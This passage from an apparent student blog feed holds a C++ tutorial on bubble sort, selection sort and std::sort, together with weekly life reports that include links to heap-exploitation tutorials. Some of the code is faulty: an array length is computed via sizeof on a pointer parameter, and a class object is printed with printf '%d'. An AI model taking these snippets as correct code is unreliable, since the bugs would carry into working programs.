alt="1625225893756.jpg"><br>​</p><p>生逢盛世，我辈有幸迎接中国共产党百年华诞。回首来路，何其艰辛，何其波澜壮阔，何其光华璀璨。中国共产党人一直把为中国人民谋幸福，为中华民族谋复兴作为自己的初心和使命，不畏艰险，不畏牺牲，百折不挠。是中国共产党带领中国人民创造了新民主主义革命的伟大成就，是中国共产党带领中国人民推翻了帝国主义、封建主义、官僚资本主义三座大山，是中国共产党带领中国人民建立了人民当家作主的中华人民共和国。<br>​</p><p>为了实现中华民族的伟大复兴，中国共产党人代代接力，书写奇迹。从一穷二白的小农经济，到充满活力的市场经济体制，中国取得了全面小康的伟大成绩。从第一部社会主义宪法的颁布，再到建成较为完善的社会主义法律法规体系，社会主义没有辜负中国，中国也没有辜负社会主义！<br>​</p><p>百年长路，感慨万千。一百年来，无数的中国共产党人坚守理想担当，坚守初心使命，为中华民族、中国人民做出不可磨灭的贡献，他们为祖国和民族建立的丰功伟绩将永载史册，他们为人民创造的辉煌成就将流芳百世。<br>​</p><p>何其有幸，我们生在红旗下，长在春风里。<br>​</p><p>请党放心，强国有我！<br>​</p><p>![F4GS34SAG7JKNC<del>L62G`3</del>5.jpg](<a href="https://cdn.nlark.com/yuque/0/2021/jpeg/1629942/1625233233448-2eab7c79-e7f1-46b5-8d21-aa4c6ae5d26d.jpeg#clientId=ue0601b88-cb5c-4&amp;from=drop&amp;id=u7d6e35df&amp;margin=%5Bobject%20Object%5D&amp;name=F4GS34SAG7JKNC~L62G%603~5.jpg&amp;originHeight=909&amp;originWidth=720&amp;originalType=binary%E2%88%B6=1&amp;size=103712&amp;status=done&amp;style=none&amp;taskId=u3006c74d-22cc-4600-86bb-1ffb72cf71b">https://cdn.nlark.com/yuque/0/2021/jpeg/1629942/1625233233448-2eab7c79-e7f1-46b5-8d21-aa4c6ae5d26d.jpeg#clientId=ue0601b88-cb5c-4&amp;from=drop&amp;id=u7d6e35df&amp;margin=%5Bobject%20Object%5D&amp;name=F4GS34SAG7JKNC~L62G%603~5.jpg&amp;originHeight=909&amp;originWidth=720&amp;originalType=binary∶=1&amp;size=103712&amp;status=done&amp;style=none&amp;taskId=u3006c74d-22cc-4600-86bb-1ffb72cf71b</a>)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;时讯&quot;&gt;&lt;a href=&quot;#时讯&quot; class=&quot;headerlink&quot; title=&quot;时讯&quot;&gt;&lt;/a&gt;时讯&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;7 月 1 日，中国共产党百年华诞。&lt;/li&gt;
&lt;li&gt;中国男足进入世界杯亚洲 12 强&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&quot;</summary>
      
    
    
    
    <category term="周报" scheme="https://www.blog.hackerjerry.top/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>排序</title>
    <link href="https://www.blog.hackerjerry.top/2021/%E6%8E%92%E5%BA%8F/"/>
    <id>https://www.blog.hackerjerry.top/2021/%E6%8E%92%E5%BA%8F/</id>
    <published>2021-06-18T07:20:40.000Z</published>
    <updated>2022-02-07T10:05:53.768Z</updated>
    
    <content type="html"><![CDATA[<p>把各类排序做一遍梳理。</p><a id="more"></a><h1 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//bubble sort</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sort</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num[])</span></span>&#123;<br>    <span class="hljs-keyword">int</span> length = <span class="hljs-keyword">sizeof</span>(num)/<span class="hljs-keyword">sizeof</span>(num[<span class="hljs-number">0</span>]);<span class="hljs-comment">//获取数组长度</span><br>    <span class="hljs-keyword">int</span> temp;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i  = <span class="hljs-number">0</span>;i &lt; length<span class="hljs-number">-1</span>; i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j&lt; length<span class="hljs-number">-1</span>-i; j++)&#123;<span class="hljs-comment">//注意这里，每一轮j比前一轮到达的位置递减</span><br>            <span class="hljs-keyword">if</span>(num[j] &gt; num[j+<span class="hljs-number">1</span>])&#123;<br>                temp = num[j];<br>                num[j] = num[j+<span class="hljs-number">1</span>];<br>                num[j+<span class="hljs-number">1</span>] = temp;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>双层循环，时间复杂度是 O(n2)。</p><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p><strong>比如说给你一个有序的数组，或者是部分有序的数组，你怎么把它的运行时间降下来</strong><br>我们可以设置一个标记位，如果在某一轮中从来没有交换过前后两个数，我们认为此时就已经有序了，没必要再进行之后的循环了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">int</span> length = <span class="hljs-keyword">sizeof</span>(num)/<span class="hljs-keyword">sizeof</span>(num[<span class="hljs-number">0</span>]);<span class="hljs-comment">//注意，计算数组长度必须要在main函数里面，而不能将num做参数传递之后再计算。</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">OptimizeSort</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num[],<span class="hljs-keyword">int</span> length)</span></span>&#123;<br>    <span class="hljs-keyword">int</span> temp;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; length - <span class="hljs-number">1</span> ; i++)&#123;<br>        <span class="hljs-keyword">bool</span> flag = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; length - <span class="hljs-number">1</span> -i; j++)&#123;<br>            <span class="hljs-keyword">if</span>(num[j] &gt; num[j+<span class="hljs-number">1</span>])&#123;<br>                temp = num[j];<br>                num[j] = num[j+<span class="hljs-number">1</span>];<br>                num[j+<span class="hljs-number">1</span>] = temp;<br>                flag = <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>          <span class="hljs-keyword">if</span>(flag)&#123;<span class="hljs-comment">//经过一轮后，flag标志没有改变，说明有序，可以退出循环</span><br>              <span class="hljs-keyword">break</span>;<br>          &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当将数组作为实参传递到另一个函数中时, 另一个函数的形参相当于一个指针变量, 因为将数组的名作为实参时, 就是<strong>将数字的首地址作为实参</strong>, 所以在 test 函数中输出的<strong>sizeof(arr)其实得到的是一个整型数组指针的长度</strong>(所占的字节数), 所以结果是 8, 再用其除以 int 所占的字节数(4), 结果就是 2。ps：这里 sizeof(&amp;arr)=8，sizeof(arr)=实际长度*4<br>要想用函数计算数组的长度，可以使用函数模板。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">count</span><span class="hljs-params">(T&amp; x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> s1 = <span class="hljs-keyword">sizeof</span>(x);<br>    <span class="hljs-keyword">int</span> s2 = <span class="hljs-keyword">sizeof</span>(x[<span class="hljs-number">0</span>]);<br>    <span class="hljs-keyword">int</span> result = s1 / s2;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> a[] = &#123; <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> &#125;;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; count(a);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>为什么可以呢？首先我们需要知道函数模板是什么。</p><h3 id="函数模板"><a href="#函数模板" class="headerlink" title="函数模板"></a>函数模板</h3><p><strong>函数模板不是一个实在的函数，编译器不能为其生成可执行代码。定义函数模板后只是一个对函数功能框架的描述，当它具体执行时，将根据传递的实际参数决定其功能。</strong><br>C++ 语言支持模板。有了模板，可以只写一个 Swap 模板，编译器会根据 Swap 模板自动生成多个 Sawp 函数，用以交换不同类型变量的值。<br>函数模板的写法如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span> &lt;<span class="hljs-class"><span class="hljs-keyword">class</span> 类型参数1, <span class="hljs-title">class</span>类型参数2, ...&gt;</span><br><span class="hljs-class">返回值类型  模板名(形参表)</span><br><span class="hljs-class">&#123;</span><br>    函数体<br>&#125;<br></code></pre></td></tr></table></figure><p>具体示例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span> &lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-class"><span class="hljs-title">void</span> <span class="hljs-title">Swap</span>(<span class="hljs-title">T</span> &amp; <span class="hljs-title">x</span>, <span class="hljs-title">T</span> &amp; <span class="hljs-title">y</span>)</span><br><span class="hljs-class">&#123;</span><br>    T tmp = x;<br>    x = y;<br>    y = tmp;<br>&#125;<br></code></pre></td></tr></table></figure><p>就像这样，它用 T 代替了普通函数定义中的数据类型，代表一种泛化类型。<br>T 是类型参数，代表类型。<br>编译器由模板自动生成函数时，会用具体的类型名对模板中所有的类型参数进行替换，其他部分则原封不动地保留。同一个类型参数只能替换为同一种类型。编译器在编译到调用函数模板的语句时，会根据实参的类型判断该如何替换模板中的类型参数。</p><h1 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h1><p>首先，找到数组中最小的元素，拎出来，将它和数组的第一个元素交换位置，第二步，在剩下的元素中继续寻找最小的元素，拎出来，和数组的第二个元素交换位置，如此循环，直到整个数组排序完成。<br><img src="https://cdn.nlark.com/yuque/0/2021/gif/1629942/1624000947793-fff1bd3e-dd53-4884-bbc8-918dec271a9c.gif#height=387&id=u26cb77fa&margin=%5Bobject%20Object%5D&originHeight=538&originWidth=955&originalType=binary%E2%88%B6=1&status=done&style=none&width=687"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp"> <span class="hljs-keyword">int</span> length = <span class="hljs-keyword">sizeof</span>(num)/<span class="hljs-keyword">sizeof</span>(num[<span class="hljs-number">0</span>]);<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SelectSort</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num[],<span class="hljs-keyword">int</span> length)</span></span>&#123;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i &lt; length;i++)&#123;<br>        <span class="hljs-keyword">int</span> min = i;<span class="hljs-comment">//只需要记录最小值的位置即可！</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j = i+<span class="hljs-number">1</span>; j &lt; length;j++)&#123;<br>            <span class="hljs-keyword">if</span> (num[min] &gt; num[j])&#123;<br>                min = j;<span class="hljs-comment">//更新最小位置</span><br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(i!=min)&#123;<br>            <span class="hljs-keyword">int</span> temp = num[min];<br>            num[min] = num[i];<br>            num[i] = temp;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>双层循环，时间复杂度和冒泡一模一样，都是 O(n2)。</p><p>#</p><h1 id="STL-库函数-sort"><a href="#STL-库函数-sort" class="headerlink" title="STL 库函数 sort"></a>STL 库函数 sort</h1><p>编写 C++经常需要使用 sort 进行排序，有可能是简单的数组、数字 vector 或者是复杂一点的存放对象的 vector。<br>C++为了满足用户的需求，在 algorithm 里面封装了 sort 泛型算法。所以使用时，必须<code>#include &lt; algorithm&gt;</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span> &lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RandomAccessIterator</span>&gt;</span><br><span class="hljs-class"><span class="hljs-title">void</span> <span class="hljs-title">sort</span> (<span class="hljs-title">RandomAccessIterator</span> <span class="hljs-title">first</span>, <span class="hljs-title">RandomAccessIterator</span> <span class="hljs-title">last</span>);</span><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RandomAccessIterator</span>, <span class="hljs-title">class</span> <span class="hljs-title">Compare</span>&gt;</span><br><span class="hljs-class"><span class="hljs-title">void</span> <span class="hljs-title">sort</span> (<span class="hljs-title">RandomAccessIterator</span> <span class="hljs-title">first</span>, <span class="hljs-title">RandomAccessIterator</span> <span class="hljs-title">last</span>, <span class="hljs-title">Compare</span> <span class="hljs-title">comp</span>);</span><br></code></pre></td></tr></table></figure><p>可以看见，sort 原型分为两个，区别在于第一个函数有两个参数，第一个函数有三个参数。<br>其中两个函数都有的是 <code>RandomAccessIterator</code> 是随机访问迭代器，first 是初始位置，last 是末尾位置，默认使用迭代器引用的 <code>operator &lt; </code>进行排序。<br>第二个函数，前两个参数一样，也是用来说明从哪儿到哪儿排序。第三个参数是<code>Compare</code>，意思是使用 comp 这个“方法”对对象进行排序。<code>comp</code>可以是函数对象或者是函数指针。</p><h2 id="默认情况"><a href="#默认情况" class="headerlink" title="默认情况"></a>默认情况</h2><ul><li>两个参数</li></ul><p>使用两个参数这应该是最普遍也是最简单的情景，如果只有两个参数，默认使用 operator &lt; 对数组排序，结果为<strong>升序</strong>。</p><h3 id="对数组排序"><a href="#对数组排序" class="headerlink" title="对数组排序"></a>对数组排序</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">int</span> arr[] = &#123; <span class="hljs-number">9</span>,<span class="hljs-number">8</span>,<span class="hljs-number">7</span>,<span class="hljs-number">6</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span> &#125;;<br>sort(arr, arr + <span class="hljs-number">9</span>);<br></code></pre></td></tr></table></figure><p>需要注意的是，这里传入的是迭代器，所以要传入头指针和末尾指针（最后一个待排元素的后一个位置）,数组的话，变量名就是起始地址。</p><h3 id="对-vector-排序"><a href="#对-vector-排序" class="headerlink" title="对 vector 排序"></a>对 vector 排序</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; arr;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">9</span>;i &gt;<span class="hljs-number">0</span>;i--)&#123;<br>    arr.push_back(i);<br>&#125;<br>sort(arr.begin(),arr.end());<br></code></pre></td></tr></table></figure><p>这里直接传入 vector 的 begin 和 end 两个迭代器就对整个 vector 完成了排序。</p><h3 id="对对象排序"><a href="#对对象排序" class="headerlink" title="对对象排序"></a>对对象排序</h3><p>如果<strong>只使用两个参数的话</strong>，要对对象排序，那么<strong>只能依靠重载运算符</strong>来实现。而且必须<strong>重载的是 &lt; 关系运算符</strong>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-keyword">int</span> value;<br>    Test() : value(<span class="hljs-number">0</span>) &#123;&#125;;<br>    Test(<span class="hljs-keyword">int</span> x) : value(x) &#123;&#125;;<br><br>    <span class="hljs-comment">// 重载运算符</span><br>    <span class="hljs-keyword">bool</span> <span class="hljs-keyword">operator</span> &lt; (<span class="hljs-keyword">const</span> Test&amp; t) &#123;<br>        <span class="hljs-keyword">if</span> (value &lt; t.value)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><br><span class="hljs-built_in">vector</span>&lt;Test&gt; arr;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">9</span>; i &gt; <span class="hljs-number">0</span>; i--) &#123;<br>    arr.push_back(Test(i));<br>&#125;<br>sort(arr.begin(), arr.end());<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i =<span class="hljs-number">0</span>;i&lt;arr.size();i++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,arr[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样，就根据 Test 类中 value 的值来升序排对象的顺序了。</p><h3 id="三个参数排序"><a href="#三个参数排序" class="headerlink" title="三个参数排序"></a>三个参数排序</h3><p>先不写了</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ol><li><a href="https://mp.weixin.qq.com/s?__biz=MzI5MzYzMDAwNw==%E2%88%A3=2247486587&idx=1&sn=7becbafba2658a4c6bf901ee65dd5277&chksm=ec6e7523db19fc358cdaac6686d4d4c5c36309b69352c33f71ece38b90fef50394a5c004cb84&mpshare=1&scene=1&srcid=">https://mp.weixin.qq.com/s?__biz=MzI5MzYzMDAwNw==∣=2247486587&amp;idx=1&amp;sn=7becbafba2658a4c6bf901ee65dd5277&amp;chksm=ec6e7523db19fc358cdaac6686d4d4c5c36309b69352c33f71ece38b90fef50394a5c004cb84&amp;mpshare=1&amp;scene=1&amp;srcid=</a></li><li>视频 | 手撕九大经典排序算法，看我就够了！ - 力扣（LeetCode）的文章 - 知乎 <a href="https://zhuanlan.zhihu.com/p/52884590">https://zhuanlan.zhihu.com/p/52884590</a></li><li><a href="https://blog.csdn.net/qq_46018418/article/details/106341404">https://blog.csdn.net/qq_46018418/article/details/106341404</a></li><li><a href="https://www.cnblogs.com/scyq/p/13053177.html">https://www.cnblogs.com/scyq/p/13053177.html</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;把各类排序做一遍梳理。&lt;/p&gt;</summary>
    
    
    
    <category term="PAT" scheme="https://www.blog.hackerjerry.top/categories/PAT/"/>
    
    
  </entry>
  
  <entry>
    <title>生活周报-June-14-to-20</title>
    <link href="https://www.blog.hackerjerry.top/2021/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-June-14-to-20/"/>
    <id>https://www.blog.hackerjerry.top/2021/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-June-14-to-20/</id>
    <published>2021-06-17T09:19:24.000Z</published>
    <updated>2022-02-07T10:05:53.824Z</updated>
    
    <content type="html"><![CDATA[<h1 id="时讯"><a href="#时讯" class="headerlink" title="时讯"></a>时讯</h1><ol><li>神州十二号发射成功</li><li>翻译泰斗许渊冲逝世，享年 100 岁</li><li>中国人首次进入自己的国际空间站</li><li>回形针被爆员工和美国军方有利益往来。</li></ol><p>​</p><h1 id="小事"><a href="#小事" class="headerlink" title="小事"></a>小事</h1><ol><li>最近的大作业、实验好多，快要撑不住了。</li><li>最近的夏令营好多，好紧张。</li><li>端午节收到了小雷的粽子，第一次吃咸粽子！一个云腿的一个菌子的，好下饭！</li><li>前一阵子气温很高（接近 40 度），然后这个周下了一周的雨。</li><li>最近掉头发有点多了，从今天，6.17，周四起，11：45 上床，不管还有什么任务没有完成，上床睡觉！</li></ol><h1 id="本周收藏"><a href="#本周收藏" class="headerlink" title="本周收藏"></a>本周收藏</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><ol><li><a href="https://www.cnblogs.com/aspirant/p/8902285.html">HashMap, HashTable，HashSet,TreeMap 的时间复杂度 注意数组链表 增删改查的时间复杂度都不相同(阿里)</a></li><li><a href="https://www.jianshu.com/p/7495fad83877">哈希表详解</a></li><li><a href="https://blog.csdn.net/hguisu/article/details/7880288">海量数据处理算法—Bit-Map</a></li><li><a href="http://www.ruanyifeng.com/blog/2015/06/poisson-distribution.html">泊松分布和指数分布</a></li><li><a href="http://www.ruanyifeng.com/blog/2018/09/hash-collision-and-birthday-attack.html">哈希碰撞与生日攻击</a></li></ol><h2 id="剧集"><a href="#剧集" class="headerlink" title="剧集"></a>剧集</h2><p>《觉醒年代》<br>《我的青铜时代 x 罗翔》<br>《我的青铜时代 x 陈佩斯》</p><h2 id="摘录"><a href="#摘录" class="headerlink" title="摘录"></a>摘录</h2><p>下面是许渊冲许老爷子的一些话，人生哲理，愿君谨记：</p><ol><li><strong>生命不是你活过了多少日子，而是你记住了多少日子。我不管活多久，认真享受每一天，做自己喜欢的事情就好。</strong></li><li><strong>不要与人争，找到自己的热爱。</strong></li></ol><hr><ol start="3"><li>最好的爱是两个人彼此做个伴，不要束缚，不要缠绕，不要占有，不要渴望从对方的身上挖掘到意义，而应该是我们两个人并排坐在一起，看看这个落寞的人间。</li><li>林徽因的<em>《别丢掉》</em></li></ol><p>别丢掉这一把过往的热情，<br>现在流水似的，<br>轻轻在幽冷的山泉底，<br>在黑夜，在松林，<br>叹息似的渺茫，<br>你仍要保存着那真！<br>一样是明月，一样是隔山灯火，<br>满天的星，<br>只有人不见，<br>梦似的挂起，<br>你向黑夜要回那一句话——你仍得相信山谷中留着那回音！</p><ol start="5"><li>人生很长，被人喜欢这件事，我不赶时间。</li></ol><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><ol><li>生成对抗网络 GAN</li><li>深度卷积神经网络进行虚假人脸识别-分别采用 MTCNN 架构、ResNet50 进行迁移学习</li><li>用 kali 进行无线安全实验，注意内置网卡无法识别，必须使用外置的无线网卡。</li></ol><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>许渊冲先生千古，他为世人留下了上百本译本。这是一位值得我一生去学习的先生、长者。<br>​</p><p>他天资聪颖，17 岁便入西南联大读书，文学造诣首屈一指。然而他却没有就此懈怠，反而一生笔耕不辍，为世人留下上百本传世佳品。<br>​</p><p>62 岁，老先生以“一年至少新译一本名著、出一本论文集、写一本散文集”的速度，酣畅创造。<br>​</p><p>86 岁，他被诊断患直肠癌，医生说，他最多只有 7 年时间。他反而照旧抓紧一切时间，翻译诗词和名著。试想，此般精神，几人能有？那是死亡的宣判啊，但许老爷子害怕了吗？抱怨了吗？放弃希望了吗？不，他没有，那团生命之火，还在尽情的燃烧着，只要希望不死，人就能拥有活下去的勇气。这难道不令人振奋吗，这难道不令人动容吗？把生命融入到自己的热爱里，即使是上天也会为之感动，许老活了下来，坚强的，用生命去创造。<br>​</p><p>90 岁高龄，他给自己制定的计划是“每天翻译 1000 字”，93 岁，他的工作目标是，翻译完莎士比亚全集，96 岁，他居然骑车出门赏月！不慎摔伤骨折，老先生依然云淡风轻，“要不是为了走这美的路，我就不会摔了，不过月光如水，还摔的挺美的”。<br>​</p><p>人生百年，先生活得精彩。<br>​</p><p>先生的人生态度，值得我一生学习：<br>​</p><p>生老病死，世事浮沉，无改天真与疯狂。<br>​</p><p>“越向前走，越有光明的前途，每一个小时，都要快快活活。”<br>​</p><p>许老爷子一路走好。<br>​</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;时讯&quot;&gt;&lt;a href=&quot;#时讯&quot; class=&quot;headerlink&quot; title=&quot;时讯&quot;&gt;&lt;/a&gt;时讯&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;神州十二号发射成功&lt;/li&gt;
&lt;li&gt;翻译泰斗许渊冲逝世，享年 100 岁&lt;/li&gt;
&lt;li&gt;中国人首次进入自己的国际空间站&lt;/</summary>
      
    
    
    
    <category term="周报" scheme="https://www.blog.hackerjerry.top/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>生活周报-May-31-to-June-6</title>
    <link href="https://www.blog.hackerjerry.top/2021/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-May-31-to-June-6/"/>
    <id>https://www.blog.hackerjerry.top/2021/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-May-31-to-June-6/</id>
    <published>2021-06-01T01:42:56.000Z</published>
    <updated>2022-02-07T10:05:53.856Z</updated>
    
    <content type="html"><![CDATA[<h1 id="时讯"><a href="#时讯" class="headerlink" title="时讯"></a>时讯</h1><ol><li>天舟二号发射成功！</li><li>黑科技的瓜</li><li>三孩政策</li><li>7 号楼偷拍事件</li><li>野生象群抵达昆明</li><li>广东疫情加重，印度变异株</li><li>摩尔庄园手游上线</li></ol><p>​</p><h1 id="小事"><a href="#小事" class="headerlink" title="小事"></a>小事</h1><ol><li>和小伙伴们深夜烧烤，喝啤酒，聊天聊地。</li><li>之前的比赛获得了西北赛区一等奖哦耶！排名第一！</li><li>最近胃口不是很好，不可以再熬夜了。</li><li>完成了预备党员的谈话面试，发挥良好！</li></ol><h1 id="本周收藏"><a href="#本周收藏" class="headerlink" title="本周收藏"></a>本周收藏</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><h3 id="二进制类"><a href="#二进制类" class="headerlink" title="二进制类"></a>二进制类</h3><p>【1】<a href="https://www.wangan.com/docs/1426">https://www.wangan.com/docs/1426</a>–类似 ctf-wiki<br>【2】<a href="https://xz.aliyun.com/t/6087">pwn 堆入门系列教程 1</a><br>【3】<a href="https://noone-hub.github.io/posts/62c86bb4/">pwn 堆入门系列教程</a><br>【4】<a href="https://www.yuque.com/cyberangel/rg9gdm/vk7hfg?language=zh-cn">PWN 进阶（1-4）-修改 ELF 动态链接到指定的 libc 库（动态链接库</a>–这个师傅记录其他的东西也很全<br>【5】<a href="https://www.jianshu.com/p/6e528b33e37a">Pwn 基础知识笔记</a><br>【6】<a href="https://blog.csdn.net/kelxLZ/article/details/112972504">How2Heap 笔记（一）</a><br>【7】<a href="https://www.sec4.fun/2020/06/14/happyheap/">堆溢出(3)-堆攻击手法</a><br>【8】<a href="https://zoepla.github.io/2018/05/how2heap%E7%B3%BB%E5%88%97(%E5%9F%BA%E7%A1%80%E7%AF%87)/">how2heap 系列(基础篇)</a><br>【9】<a href="https://www.anquanke.com/post/id/86808">【技术分享】how2heap 总结-上</a></p><h2 id="剧集"><a href="#剧集" class="headerlink" 